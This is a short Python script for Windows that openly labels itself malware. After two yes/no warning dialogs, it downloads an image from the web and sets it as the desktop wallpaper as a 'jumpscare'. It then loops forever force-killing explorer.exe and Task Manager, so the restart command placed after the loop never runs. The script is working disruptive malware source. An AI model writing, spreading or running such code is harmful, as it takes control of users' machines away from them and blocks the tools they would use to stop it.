import os, ctypes, urllib.request, win32gui, time, random, winreg, subprocess
import commctrl as cc
import win32gui as win32gui

Popup1 = ctypes.windll.user32.MessageBoxW(0, "This is malware no joke, contuine?", "Warning!", 4)
Popup1

if Popup1 == (6):  # 6 means yes, 7 means no
    Popup2 = ctypes.windll.user32.MessageBoxW(0, "Are you SURE? This is MALWARE, contuine?", "Last Warning!", 4)
    Popup2 
    if Popup2 == (6): # 6 means yes, 7 means no

        #Changes wallpaper
        DesktopURL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfAznvpDlbIffjbLsAZIPm6O95iCl9Nhcb_k8iGZUdXw&s"
        PATH=urllib.request.urlretrieve(DesktopURL)[0]
        ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)


        # Kill Critical Proccess
        time.sleep(2)
        while True:
            time.sleep(1.5)
            os.system("taskkill /f /im  explorer.exe")
            os.system("taskkill /f /im  Taskmgr.exe")

        # Restart Computer
        time.sleep(6) # Time to let person see jumpscare
        subprocess.call(["shutdown", "-r", "-t", "0"]) 


